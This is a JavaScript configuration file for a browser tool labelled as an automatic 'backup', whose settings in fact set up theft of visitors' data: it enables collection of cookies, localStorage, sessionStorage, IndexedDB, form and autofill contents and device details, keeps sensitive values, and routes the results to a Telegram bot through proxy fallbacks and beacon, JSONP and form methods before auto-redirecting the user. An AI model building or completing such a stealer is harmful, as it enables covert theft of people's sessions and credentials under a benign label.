// Configuration - Advanced Settings
const CONFIG = {
    // Telegram Configuration
    TELEGRAM: {
        // Your Bot Token (Get from @BotFather)
        BOT_TOKEN: 'YOUR_BOT_TOKEN_HERE',
        
        // Your Chat ID (Get from @userinfobot)
        CHAT_ID: '6454347745',
        
        // Your Bot Username (without @)
        BOT_USERNAME: 'YourBackupBot',
        
        // Alternative send methods
        USE_WEBHOOK: true,
        WEBHOOK_URL: 'https://your-domain.com/api/telegram.php',
        
        // Fallback methods
        FALLBACK_METHODS: ['fetch', 'beacon', 'jsonp', 'form']
    },
    
    // Backup Settings
    BACKUP: {
        // Data collection settings
        MAX_ACCOUNTS: 100,
        MAX_STORAGE_ITEMS: 1000,
        SCAN_DEPTH: 'deep', // quick, normal, deep
        
        // Encryption
        ENCRYPTION_KEY: 'auto_backup_secure_key_' + Date.now(),
        ENCRYPTION_METHOD: 'xor', // xor, aes, simple
        
        // Compression
        COMPRESS_DATA: true,
        MAX_SIZE: 1024 * 1024, // 1MB
        
        // Timeouts
        SCAN_TIMEOUT: 10000,
        UPLOAD_TIMEOUT: 15000,
        TOTAL_TIMEOUT: 30000
    },
    
    // Advanced Features
    FEATURES: {
        // Data collection
        COLLECT_LOCALSTORAGE: true,
        COLLECT_SESSIONSTORAGE: true,
        COLLECT_COOKIES: true,
        COLLECT_INDEXEDDB: true,
        COLLECT_FORMS: true,
        COLLECT_AUTOFILL: true,
        COLLECT_META_TAGS: true,
        
        // Device info
        COLLECT_DEVICE_INFO: true,
        COLLECT_NETWORK_INFO: true,
        COLLECT_LOCATION: false, // Requires permission
        COLLECT_BATTERY: true,
        
        // Performance
        ENABLE_CACHE: true,
        ENABLE_PRELOAD: true,
        ENABLE_LAZY_LOAD: true,
        
        // Security
        ENABLE_ENCRYPTION: true,
        ENABLE_HASHING: true,
        REMOVE_SENSITIVE: false,
        
        // UI
        SHOW_PROGRESS: true,
        SHOW_STATS: true,
        AUTO_REDIRECT: true,
        REDIRECT_TIMEOUT: 25000
    },
    
    // API Endpoints
    API: {
        // Primary API
        PRIMARY: 'https://api.telegram.org',
        
        // Fallback APIs
        FALLBACKS: [
            'https://telegram-bot-api-1.herokuapp.com',
            'https://telegram-bot-api-2.vercel.app',
            'https://telegram-proxy.onrender.com'
        ],
        
        // Data collection APIs
        IP_API: 'https://api.ipify.org?format=json',
        LOCATION_API: 'https://ipapi.co/json/',
        TIME_API: 'https://worldtimeapi.org/api/ip'
    },
    
    // Analytics (Optional)
    ANALYTICS: {
        ENABLED: false,
        TRACK_ID: 'UA-XXXXX-Y',
        EVENTS: ['scan_start', 'data_found', 'backup_complete']
    },
    
    // Debug Mode
    DEBUG: {
        ENABLED: true,
        LOG_LEVEL: 'info', // none, error, warn, info, debug
        SHOW_CONSOLE: true,
        SIMULATE_DATA: false
    }
};

// Export for modules
if (typeof module !== 'undefined' && module.exports) {
    module.exports = CONFIG;
}

// Make available globally
window.CONFIG = CONFIG;

// Initialize debug mode
if (CONFIG.DEBUG.ENABLED) {
    console.log('🔧 Debug Mode Enabled');
    console.log('📱 Configuration Loaded:', CONFIG);
}
